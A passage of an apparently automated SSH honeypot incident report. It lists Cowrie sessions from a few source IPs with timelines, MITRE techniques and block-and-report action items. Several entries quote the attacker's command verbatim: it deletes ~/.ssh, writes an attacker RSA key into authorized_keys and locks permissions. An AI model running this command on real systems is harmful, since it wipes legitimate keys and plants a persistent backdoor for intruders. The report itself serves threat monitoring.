- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1fd215ddf77

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:17 |
| **Last Seen** | 2026-07-05 07:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:17:30` | `cowrie.session.connect` |
| `2026-07-05 07:17:30` | `cowrie.client.version` |
| `2026-07-05 07:17:30` | `cowrie.client.kex` |
| `2026-07-05 07:17:31` | `cowrie.login.success` |
| `2026-07-05 07:17:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f30fb37f9d3

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:17 |
| **Last Seen** | 2026-07-05 07:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:17:32` | `cowrie.session.connect` |
| `2026-07-05 07:17:32` | `cowrie.client.version` |
| `2026-07-05 07:17:32` | `cowrie.client.kex` |
| `2026-07-05 07:17:33` | `cowrie.login.success` |
| `2026-07-05 07:17:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73a71bd19eb1

| Field | Detail |
|---|---|
| **Source IP** | `111.47.243[.]219` |
| **First Seen** | 2026-07-05 07:17 |
| **Last Seen** | 2026-07-05 07:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:17:32` | `cowrie.session.connect` |
| `2026-07-05 07:17:32` | `cowrie.client.version` |
| `2026-07-05 07:17:32` | `cowrie.client.kex` |
| `2026-07-05 07:17:33` | `cowrie.login.success` |
| `2026-07-05 07:17:34` | `cowrie.session.params` |
| `2026-07-05 07:17:34` | `cowrie.command.input` |
| `2026-07-05 07:17:34` | `cowrie.command.failed` |
| `2026-07-05 07:17:35` | `cowrie.log.closed` |
| `2026-07-05 07:17:36` | `cowrie.session.params` |
| `2026-07-05 07:17:36` | `cowrie.command.input` |
| `2026-07-05 07:17:36` | `cowrie.session.file_download` |
| `2026-07-05 07:17:36` | `cowrie.log.closed` |
| `2026-07-05 07:17:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.47.243[.]219` to AbuseIPDB if not already reported
- [ ] Block `111.47.243[.]219` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc54b3f9bcbf

| Field | Detail |
|---|---|
| **Source IP** | `111.47.243[.]219` |
| **First Seen** | 2026-07-05 07:17 |
| **Last Seen** | 2026-07-05 07:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:17:36` | `cowrie.session.connect` |
| `2026-07-05 07:17:36` | `cowrie.client.version` |
| `2026-07-05 07:17:37` | `cowrie.client.kex` |
| `2026-07-05 07:17:38` | `cowrie.login.success` |
| `2026-07-05 07:17:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.47.243[.]219` to AbuseIPDB if not already reported
- [ ] Block `111.47.243[.]219` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94d1670adf13

| Field | Detail |
|---|---|
| **Source IP** | `111.47.243[.]219` |
| **First Seen** | 2026-07-05 07:17 |
| **Last Seen** | 2026-07-05 07:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:17:39` | `cowrie.session.connect` |
| `2026-07-05 07:17:39` | `cowrie.client.version` |
| `2026-07-05 07:17:39` | `cowrie.client.kex` |
| `2026-07-05 07:17:40` | `cowrie.login.success` |
| `2026-07-05 07:17:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.47.243[.]219` to AbuseIPDB if not already reported
- [ ] Block `111.47.243[.]219` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42719dfff7e3

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:17 |
| **Last Seen** | 2026-07-05 07:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:17:49` | `cowrie.session.connect` |
| `2026-07-05 07:17:49` | `cowrie.client.version` |
| `2026-07-05 07:17:50` | `cowrie.client.kex` |
| `2026-07-05 07:17:51` | `cowrie.login.success` |
| `2026-07-05 07:17:52` | `cowrie.session.params` |
| `2026-07-05 07:17:52` | `cowrie.command.input` |
| `2026-07-05 07:17:52` | `cowrie.command.failed` |
| `2026-07-05 07:17:52` | `cowrie.log.closed` |
| `2026-07-05 07:17:53` | `cowrie.session.params` |
| `2026-07-05 07:17:53` | `cowrie.command.input` |
| `2026-07-05 07:17:53` | `cowrie.session.file_download` |
| `2026-07-05 07:17:53` | `cowrie.log.closed` |
| `2026-07-05 07:17:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc1184981497

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:17 |
| **Last Seen** | 2026-07-05 07:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:17:54` | `cowrie.session.connect` |
| `2026-07-05 07:17:54` | `cowrie.client.version` |
| `2026-07-05 07:17:54` | `cowrie.client.kex` |
| `2026-07-05 07:17:55` | `cowrie.login.success` |
| `2026-07-05 07:17:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b13248b6ae2

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:17 |
| **Last Seen** | 2026-07-05 07:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:17:55` | `cowrie.session.connect` |
| `2026-07-05 07:17:55` | `cowrie.client.version` |
| `2026-07-05 07:17:56` | `cowrie.client.kex` |
| `2026-07-05 07:17:57` | `cowrie.login.success` |
| `2026-07-05 07:17:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dff218e95ec5

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:18 |
| **Last Seen** | 2026-07-05 07:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:18:14` | `cowrie.session.connect` |
| `2026-07-05 07:18:14` | `cowrie.client.version` |
| `2026-07-05 07:18:14` | `cowrie.client.kex` |
| `2026-07-05 07:18:16` | `cowrie.login.success` |
| `2026-07-05 07:18:17` | `cowrie.session.params` |
| `2026-07-05 07:18:17` | `cowrie.command.input` |
| `2026-07-05 07:18:17` | `cowrie.command.failed` |
| `2026-07-05 07:18:17` | `cowrie.log.closed` |
| `2026-07-05 07:18:18` | `cowrie.session.params` |
| `2026-07-05 07:18:18` | `cowrie.command.input` |
| `2026-07-05 07:18:18` | `cowrie.session.file_download` |
| `2026-07-05 07:18:18` | `cowrie.log.closed` |
| `2026-07-05 07:18:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df4e4c296dc9

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:18 |
| **Last Seen** | 2026-07-05 07:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:18:19` | `cowrie.session.connect` |
| `2026-07-05 07:18:19` | `cowrie.client.version` |
| `2026-07-05 07:18:19` | `cowrie.client.kex` |
| `2026-07-05 07:18:20` | `cowrie.login.success` |
| `2026-07-05 07:18:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbe3ecd58e36

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:18 |
| **Last Seen** | 2026-07-05 07:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:18:21` | `cowrie.session.connect` |
| `2026-07-05 07:18:21` | `cowrie.client.version` |
| `2026-07-05 07:18:21` | `cowrie.client.kex` |
| `2026-07-05 07:18:22` | `cowrie.login.success` |
| `2026-07-05 07:18:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cc1b482dd99

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:18 |
| **Last Seen** | 2026-07-05 07:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:18:37` | `cowrie.session.connect` |
| `2026-07-05 07:18:37` | `cowrie.client.version` |
| `2026-07-05 07:18:37` | `cowrie.client.kex` |
| `2026-07-05 07:18:38` | `cowrie.login.success` |
| `2026-07-05 07:18:39` | `cowrie.session.params` |
| `2026-07-05 07:18:39` | `cowrie.command.input` |
| `2026-07-05 07:18:39` | `cowrie.command.failed` |
| `2026-07-05 07:18:40` | `cowrie.log.closed` |
| `2026-07-05 07:18:41` | `cowrie.session.params` |
| `2026-07-05 07:18:41` | `cowrie.command.input` |
| `2026-07-05 07:18:41` | `cowrie.session.file_download` |
| `2026-07-05 07:18:41` | `cowrie.log.closed` |
| `2026-07-05 07:18:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6bce94690a0

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:18 |
| **Last Seen** | 2026-07-05 07:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:18:41` | `cowrie.session.connect` |
| `2026-07-05 07:18:41` | `cowrie.client.version` |
| `2026-07-05 07:18:42` | `cowrie.client.kex` |
| `2026-07-05 07:18:43` | `cowrie.login.success` |
| `2026-07-05 07:18:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54ecafad0247

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:18 |
| **Last Seen** | 2026-07-05 07:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:18:43` | `cowrie.session.connect` |
| `2026-07-05 07:18:43` | `cowrie.client.version` |
| `2026-07-05 07:18:44` | `cowrie.client.kex` |
| `2026-07-05 07:18:45` | `cowrie.login.success` |
| `2026-07-05 07:18:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15c771012c52

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:19 |
| **Last Seen** | 2026-07-05 07:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:19:00` | `cowrie.session.connect` |
| `2026-07-05 07:19:00` | `cowrie.client.version` |
| `2026-07-05 07:19:00` | `cowrie.client.kex` |
| `2026-07-05 07:19:01` | `cowrie.login.success` |
| `2026-07-05 07:19:02` | `cowrie.session.params` |
| `2026-07-05 07:19:02` | `cowrie.command.input` |
| `2026-07-05 07:19:02` | `cowrie.command.failed` |
| `2026-07-05 07:19:03` | `cowrie.log.closed` |
| `2026-07-05 07:19:03` | `cowrie.session.params` |
| `2026-07-05 07:19:03` | `cowrie.command.input` |
| `2026-07-05 07:19:04` | `cowrie.session.file_download` |
| `2026-07-05 07:19:04` | `cowrie.log.closed` |
| `2026-07-05 07:19:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1af96258027e

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:19 |
| **Last Seen** | 2026-07-05 07:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:19:04` | `cowrie.session.connect` |
| `2026-07-05 07:19:04` | `cowrie.client.version` |
| `2026-07-05 07:19:04` | `cowrie.client.kex` |
| `2026-07-05 07:19:05` | `cowrie.login.success` |
| `2026-07-05 07:19:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b81c87b979cc

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:19 |
| **Last Seen** | 2026-07-05 07:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:19:06` | `cowrie.session.connect` |
| `2026-07-05 07:19:06` | `cowrie.client.version` |
| `2026-07-05 07:19:06` | `cowrie.client.kex` |
| `2026-07-05 07:19:07` | `cowrie.login.success` |
| `2026-07-05 07:19:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26862012d8c6

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 07:29 |
| **Last Seen** | 2026-07-05 07:29 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:29:28` | `cowrie.session.connect` |
| `2026-07-05 07:29:29` | `cowrie.client.version` |
| `2026-07-05 07:29:29` | `cowrie.client.kex` |
| `2026-07-05 07:29:36` | `cowrie.login.success` |
| `2026-07-05 07:29:39` | `cowrie.session.params` |
| `2026-07-05 07:29:39` | `cowrie.command.input` |
| `2026-07-05 07:29:40` | `cowrie.log.closed` |
| `2026-07-05 07:29:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f8bf50819ce

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 07:41 |
| **Last Seen** | 2026-07-05 07:41 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:41:20` | `cowrie.session.connect` |
| `2026-07-05 07:41:22` | `cowrie.client.version` |
| `2026-07-05 07:41:22` | `cowrie.client.kex` |
| `2026-07-05 07:41:28` | `cowrie.login.success` |
| `2026-07-05 07:41:33` | `cowrie.session.params` |
| `2026-07-05 07:41:33` | `cowrie.command.input` |
| `2026-07-05 07:41:34` | `cowrie.log.closed` |
| `2026-07-05 07:41:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc799081702b

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-05 07:44 |
| **Last Seen** | 2026-07-05 07:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:44:19` | `cowrie.session.connect` |
| `2026-07-05 07:44:19` | `cowrie.client.version` |
| `2026-07-05 07:44:19` | `cowrie.client.kex` |
| `2026-07-05 07:44:20` | `cowrie.login.success` |
| `2026-07-05 07:44:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d197b8186ac2

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-05 07:44 |
| **Last Seen** | 2026-07-05 07:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:44:19` | `cowrie.session.connect` |
| `2026-07-05 07:44:19` | `cowrie.client.version` |
| `2026-07-05 07:44:19` | `cowrie.client.kex` |
| `2026-07-05 07:44:20` | `cowrie.login.success` |
| `2026-07-05 07:44:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa8220c5e6f9

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-05 07:44 |
| **Last Seen** | 2026-07-05 07:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:44:21` | `cowrie.session.connect` |
| `2026-07-05 07:44:21` | `cowrie.client.version` |
| `2026-07-05 07:44:21` | `cowrie.client.kex` |
| `2026-07-05 07:44:22` | `cowrie.login.success` |
| `2026-07-05 07:44:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfef1a06c70c

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-05 07:44 |
| **Last Seen** | 2026-07-05 07:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:44:22` | `cowrie.session.connect` |
| `2026-07-05 07:44:22` | `cowrie.client.version` |
| `2026-07-05 07:44:23` | `cowrie.client.kex` |
| `2026-07-05 07:44:24` | `cowrie.login.success` |
